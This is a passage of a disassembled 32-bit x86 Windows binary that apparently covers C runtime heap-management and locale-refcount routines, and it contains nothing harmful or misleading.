  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
